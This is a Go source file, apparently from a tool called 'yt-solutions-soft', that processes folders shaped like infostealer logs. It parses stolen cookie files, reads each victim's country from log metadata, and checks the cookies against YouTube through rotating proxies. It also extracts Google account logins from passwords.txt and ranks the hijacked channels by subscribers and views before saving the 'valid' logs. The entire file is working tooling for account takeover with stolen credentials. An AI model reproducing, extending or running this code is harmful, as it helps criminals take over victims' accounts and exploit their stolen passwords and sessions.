package checker

import (
	"errors"
	"fmt"
	"io"
	"io/fs"
	"net/http"
	"net/url"
	"os"
	"path"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
	"yt-solutions-soft/internal/models"
	"yt-solutions-soft/internal/service/checker/client"

	"github.com/aki237/nscjar"
)

var (
	checkedDirs = make(map[string][]*models.CookieInfo)
)

var (
	//Уникальные каналы во всем логе
	channelsInLog = make(map[string]map[string]*models.CookieInfo)

	//Уникальные каналы по текстовикам
	channelsInEachTxt = make(map[string]map[string][]*models.CookieInfo)
)

type Client interface {
	CheckCookies(cookies []*http.Cookie, cookieGeo, cookiesPath, cookiesTxtPath string, checkControl *models.CheckedAmount, updatesChan chan models.Update, resultChan chan *models.CookieInfo)
}

type YouTubeChecker struct {
	Client   Client
	ProxyNum int
}

func NewYouTubeChekcer() *YouTubeChecker {
	return &YouTubeChecker{}
}

func (yt *YouTubeChecker) CheckFolder(checkPath, savePath string, updatesChan chan models.Update, proxies []models.Proxy) {
	var wg sync.WaitGroup

	checkControl := &models.CheckedAmount{}
	resultChan := make(chan *models.CookieInfo, 10)

	checkContent, err := os.ReadDir(checkPath)
	if err != nil {
		upd := models.Update{Type: models.ErrorNotifyType, Err: err}
		updatesChan <- upd
	}

	wg.Add(1)
	go func() {
		defer wg.Done()

		var innerWg sync.WaitGroup
		for _, folder := range checkContent {
			if !folder.IsDir() {
				continue
			}
			folderPath := path.Join(checkPath, folder.Name())

			var txts []string
			err := filepath.Walk(folderPath, func(path string, info fs.FileInfo, err error) error {
				if filepath.Ext(path) == ".txt" && strings.Contains(strings.ToLower(path), "cookies") {
					txts = append(txts, path)
				}

				return nil
			})
			if err != nil {
				return
			}

			geo, err := yt.getGeo(folderPath)
			if err != nil {
				return
			}

			for _, txt := range txts {

				if !strings.Contains(strings.ToLower(txt), "cookies") {
					continue
				}

				cookies, err := yt.cookiesFromTxt(txt)
				if err != nil {
					continue
				}

				if len(cookies) == 0 {
					continue
				}

				if err := yt.setClient(proxies); err != nil {
					fmt.Println(err)
					upd := models.Update{Type: models.ErrorNotifyType, Err: err}
					updatesChan <- upd
				}

				innerWg.Add(1)
				go func(cookies []*http.Cookie, cookiesPath, txtPath string) {
					defer innerWg.Done()

					yt.Client.CheckCookies(cookies, geo, folderPath, txtPath, checkControl, updatesChan, resultChan)

				}(cookies, folderPath, txt)
				checkControl.Checked++

				upd := models.Update{Type: models.CheckStatusType, Data: *checkControl}
				updatesChan <- upd
				runtime.GC()
			}
		}
		innerWg.Wait()
		close(resultChan)
	}()

	for result := range resultChan {
		yt.sortByPath(result)
		yt.sortByTxt(result)
	}
	wg.Wait()

	upd := models.Update{Type: models.SavingValidType, Data: "Saving valid"}
	updatesChan <- upd
	defer yt.clearCheckHistory()

	if err := os.MkdirAll(path.Join(savePath, allCookiesFolderName), os.ModePerm); err != nil {
		upd := models.Update{Type: models.ErrorNotifyType, Data: *checkControl, Err: SaveError}
		updatesChan <- upd
	}

	//TODO горутины

	if err := yt.saveValidLogs(checkPath, savePath); err != nil {
		checkControl.Errors++
		upd := models.Update{Type: models.ErrorNotifyType, Data: *checkControl, Err: SaveError}
		updatesChan <- upd
	}
	close(updatesChan)
}

func (yt *YouTubeChecker) sortByPath(result *models.CookieInfo) {
	if _, ok := channelsInLog[result.Path]; ok {
		channelsInLog[result.Path][result.ID] = result
		return
	}

	channelsInfo := make(map[string]*models.CookieInfo)
	channelsInfo[result.ID] = result
	channelsInLog[result.Path] = channelsInfo
}

func (yt *YouTubeChecker) sortByTxt(result *models.CookieInfo) {
	if _, ok := channelsInEachTxt[result.Path]; ok {
		channels := channelsInEachTxt[result.Path][result.TxtPath]
		channels = append(channels, result)

		channelsInEachTxt[result.Path][result.TxtPath] = channels
		return
	}

	txtChannelsInfo := make(map[string][]*models.CookieInfo)
	txtChannelsInfo[result.TxtPath] = []*models.CookieInfo{result}
	channelsInEachTxt[result.Path] = txtChannelsInfo
}

func (yt *YouTubeChecker) cookiesFromTxt(txtPath string) ([]*http.Cookie, error) {
	var jar nscjar.Parser

	cookieFile, err := os.Open(txtPath)
	if err != nil {
		return nil, err
	}
	defer cookieFile.Close()

	return jar.Unmarshal(cookieFile)
}

func (yt *YouTubeChecker) saveValidLogs(checkPath, savePath string) error {

	for logPath := range channelsInLog {
		folderName := yt.formSaveFolderName(logPath)

		err := filepath.Walk(logPath, func(p string, file fs.FileInfo, err error) error {
			if _, err := os.ReadDir(path.Join(savePath, folderName)); err != nil {
				if err := os.MkdirAll(path.Join(savePath, folderName), os.ModePerm); err != nil {
					return err
				}
				return nil
			}

			rawPath := strings.Split(p, checkPath)[1]
			if len(strings.SplitN(rawPath, `\`, 3)) < 3 {
				return errors.New("invalid path")
			}

			rawContent := strings.SplitN(rawPath, `\`, 3)[2]

			if file.IsDir() {
				if err := os.MkdirAll(path.Join(savePath, folderName, rawContent), os.ModePerm); err != nil {
					return err
				}
				return nil
			}

			dstFile, err := os.OpenFile(path.Join(savePath, folderName, rawContent), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				return err
			}
			defer dstFile.Close()

			srcFile, err := os.Open(p)
			if err != nil {
				return err
			}
			defer srcFile.Close()

			if _, err := io.Copy(dstFile, srcFile); err != nil {
				return err
			}

			return nil
		})
		if err != nil {
			return err
		}

		if err = yt.makeCheckerResult(logPath, savePath, folderName); err != nil {
			return err
		}

		if err = yt.saveCookiesTxt(logPath, path.Join(savePath, allCookiesFolderName)); err != nil {
			return err
		}
	}

	return nil
}

func (yt *YouTubeChecker) formSaveFolderName(logPath string) string {
	var date time.Time

	subs, views, i := 0, 0, 0
	if channels, ok := channelsInLog[logPath]; ok {
		for _, channel := range channels {
			if i == 0 {
				date, _ = time.Parse("Jan 2, 2006", channel.RegDate)
				i++
			}
			currentDate, _ := time.Parse("Jan 2, 2006", channel.RegDate)

			if date.After(currentDate) {
				date = currentDate
			}

			subs = subs + channel.Subscribes
			views = views + channel.ViewsCount
		}
	}

	return fmt.Sprintf("[%d subs] [%d views] [%v] [%d channels] %s", subs, views, date, len(channelsInLog[logPath]), strings.Split(strings.ReplaceAll(logPath, "\\", "/"), "/")[len(strings.Split(strings.ReplaceAll(logPath, "\\", "/"), "/"))-1])
}

func (yt *YouTubeChecker) countCookieTotal(info []*models.CookieInfo) (int, int) {
	var views, subs int

	for _, i := range info {
		views = views + i.ViewsCount
		subs = subs + i.Subscribes
	}

	return views, subs
}

func (yt *YouTubeChecker) formFolderName(views, subs int, info []*models.CookieInfo) string {
	var ids string

	for _, i := range info {
		if ids == "" {
			ids = fmt.Sprintf("%s", i.ID)
			continue
		}
		ids = fmt.Sprintf("%s %s", ids, i.ID)
	}

	return fmt.Sprintf("[%d subs] [%d views] [%d channels] [%s]", subs, views, len(info), ids)
}

func (yt *YouTubeChecker) makeCheckerResult(logPath, savePath, folderName string) error {

	pass, err := yt.findPassword(logPath)
	if err != nil {
		return err
	}

	channels, _ := yt.channelsInformation(logPath)

	checkerResultPath := path.Join(savePath, folderName, checkerFolderName)

	if err := os.MkdirAll(checkerResultPath, os.ModePerm); err != nil {
		return err
	}

	infoFile, err := os.OpenFile(path.Join(checkerResultPath, infoFileName), os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer infoFile.Close()

	if _, err = infoFile.Write([]byte(pass)); err != nil {
		return err
	}

	if _, err = infoFile.Write([]byte(channels)); err != nil {
		return err
	}

	if err = yt.saveCookiesTxt(logPath, checkerResultPath); err != nil {
		return err
	}

	return nil
}

func (yt *YouTubeChecker) saveCookiesTxt(logPath, savePath string) error {
	for srcPath, channels := range channelsInEachTxt[logPath] {
		name := yt.formCookiesTxtName(logPath, channels)

		cookieFile, err := os.OpenFile(path.Join(savePath, fmt.Sprintf("%s.txt", name)), os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			continue
		}

		srcFile, err := os.ReadFile(srcPath)
		if err != nil {
			continue
		}

		if _, err = cookieFile.Write(srcFile); err != nil {
			continue
		}
		cookieFile.Close()
	}

	return nil
}

func (yt *YouTubeChecker) formCookiesTxtName(logPath string, info []*models.CookieInfo) string {

	if len(info) == 0 {
		return ""
	}

	var subs, views int

	for _, channel := range info {
		subs = subs + channel.Subscribes
		views = views + channel.ViewsCount
	}

	return fmt.Sprintf("[%d subs] [%d views] [%d channels] %s", subs, views, len(info), strings.Split(strings.ReplaceAll(logPath, "\\", "/"), "/")[len(strings.Split(strings.ReplaceAll(logPath, "\\", "/"), "/"))-1])
}

func (yt *YouTubeChecker) getGeo(cookiePath string) (string, error) {
	dir, err := os.ReadDir(cookiePath)
	if err != nil {
		return "", err
	}

	for _, file := range dir {
		if strings.ToLower(file.Name()) == "userinformation.txt" {
			content, err := os.ReadFile(path.Join(cookiePath, file.Name()))
			if err != nil {
				return "", err
			}

			lines := strings.Split(string(content), "\n")
			for _, line := range lines {
				if strings.Contains(line, "Country") {
					return strings.Split(line, ":")[1], nil
				}
			}
		}

		if strings.ToLower(file.Name()) == "system info.txt" {
			content, err := os.ReadFile(path.Join(cookiePath, file.Name()))
			if err != nil {
				return "", err
			}

			lines := strings.Split(string(content), "\n")
			for _, line := range lines {
				if strings.Contains(line, "IP info") {
					return strings.Split(line, " ")[2], nil
				}
			}
		}

		if strings.ToLower(file.Name()) == "information.txt" {
			content, err := os.ReadFile(path.Join(cookiePath, file.Name()))
			if err != nil {
				return "", err
			}

			lines := strings.Split(string(content), "\n")
			for _, line := range lines {
				if strings.Contains(line, "Country") {
					return strings.Split(line, " ")[1], nil
				}
			}
		}

		if strings.ToLower(file.Name()) == "info.txt" {
			content, err := os.ReadFile(path.Join(cookiePath, file.Name()))
			if err != nil {
				return "", err
			}

			lines := strings.Split(string(content), "\n")
			for _, line := range lines {
				if strings.Contains(line, "Country") {
					return strings.Split(line, " ")[1], nil
				}
			}
		}
	}

	return "", nil
}

func (yt *YouTubeChecker) findPassword(cookiePath string) (string, error) {
	var result string

	dir, err := os.ReadDir(cookiePath)
	if err != nil {
		return "", err
	}

	for _, file := range dir {
		if strings.ToLower(file.Name()) == "passwords.txt" {
			content, err := os.ReadFile(path.Join(cookiePath, file.Name()))
			if err != nil {
				continue
			}
			lines := strings.Split(string(content), "\n")

			for i, line := range lines {
				if strings.Contains(line, "accounts.google.com") {
					if len(lines) <= i+2 {
						return "", err
					}
					username := lines[i+1]
					password := lines[i+2]

					if !strings.Contains(username, "@") {
						continue
					}

					if result == "" {
						result = fmt.Sprintf("Возможные пароли:\n%s\n%s\n", username, password)
						continue
					}
					result = fmt.Sprintf("%s\n%s\n%s\n", result, username, password)
				}
			}
		}
	}
	if result == "" {
		return passwordsNotFound, err
	}

	return result + "\n", err
}

func (yt *YouTubeChecker) channelsInformation(logPath string) (string, string) {
	var main, result string

	max := -1
	for _, channel := range channelsInLog[logPath] {
		if channel.Subscribes > max {
			main = channel.ID
			max = channel.Subscribes
		}
	}
	result = fmt.Sprintf("Основной: https://www.youtube.com/channel/%s - %d subs\n\nДополнительные: \n", main, max)

	for _, channel := range channelsInLog[logPath] {
		if channel.ID != main {
			result = fmt.Sprintf("%shttps://www.youtube.com/channel/%s - %d subs\n", result, channel.ID, channel.Subscribes)
		}
	}

	return result, main
}

func (yt *YouTubeChecker) clearCheckHistory() {
	for k := range channelsInLog {
		delete(channelsInLog, k)
	}

	for k := range channelsInEachTxt {
		delete(channelsInEachTxt, k)
	}
}

func (yt *YouTubeChecker) setClient(proxies []models.Proxy) error {

	if len(proxies) == 0 {
		yt.Client = client.NewClient(nil)
		return nil
	}

	if yt.ProxyNum == len(proxies) {
		yt.ProxyNum = 0
	}

	proxy := proxies[yt.ProxyNum]

	u, err := url.Parse(fmt.Sprintf("http://%s:%s@%s:%s", proxy.User, proxy.Password, proxy.IP, proxy.Port))
	if err != nil {
		return err
	}

	yt.Client = client.NewClient(u)
	yt.ProxyNum++

	return nil
}
